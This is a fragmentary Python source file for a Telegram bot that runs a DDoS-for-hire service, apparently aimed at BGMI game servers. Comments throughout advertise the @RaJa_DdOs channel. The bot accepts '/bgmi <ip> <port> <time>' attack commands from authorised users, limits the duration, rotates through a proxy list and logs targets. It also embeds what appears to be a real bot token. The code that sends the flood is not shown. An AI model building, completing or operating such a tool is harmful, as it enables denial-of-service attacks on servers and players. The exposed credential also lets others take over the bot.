...
# Join :- @RaJa_DdOs #bgmiddoserpython
...
# Join :- @RaJa_DdOs #from keep_alive import keep_alive
# Join :- @RaJa_DdOs #keep_alive()
# Join :- @RaJa_DdOs # insert your Telegram bot token here

from keep_alive import keep_alive
keep_alive()

bot = telebot.TeleBot('7083324512:AAEOMBy5BB-lG5SXfNe_jXESXXYsL3nUa_I')

# Join :- @RaJa_DdOs # Admin user IDs
admin_id = ["5397524434"]

# Join :- @RaJa_DdOs # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- @RaJa_DdOs # File to store command logs
LOG_FILE = "log.txt"


# Join :- @RaJa_DdOs # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- @Harsh DDOD # Add more proxy addresses as needed
]
...
# Join :- @RaJa_DdOs # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Join :- @RaJa_DdOs # Check if line is not empty
...
# Join :- @RaJa_DdOs # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- @RaJa_DdOs # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Join :- @RaJa_DdOs # Function to clear logs
def clear_logs():
    try:
...
# Join :- @RaJa_DdOs # Function to record command logs
...
# Join :- @RaJa_DdOs # Function to handle the reply when free users run the /bgmi command
...
# Join :- @RaJa_DdOs # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 𝟭 𝗺𝗶𝗻𝘂𝘁𝗲 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Join :- @RaJa_DdOs # Updated to accept target, time, and port
            ...
            if time > 250:
                response = "𝗘𝗿𝗿𝗼𝗿: 𝗧𝗶𝗺𝗲 𝗶𝗻𝘁𝗲𝗿𝘃𝗮𝗹 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 250."
            else:
            ...
            response = "🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨>\n\n🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  /bgmi 20.235.94.237 17870 250"  # Join :- @RaJa_DdOs # Updated command syntax
    else:
        response = " 𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @HARSHGUJJAR88 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"

    bot.reply_to(message, response)



# Join :- @RaJa_DdOs # Add /mylogs command to display logs recorded for bgmi and website commands
...
# Join :- @RaJa_DdOs # Import the 'time' module for sleep functionality
import time
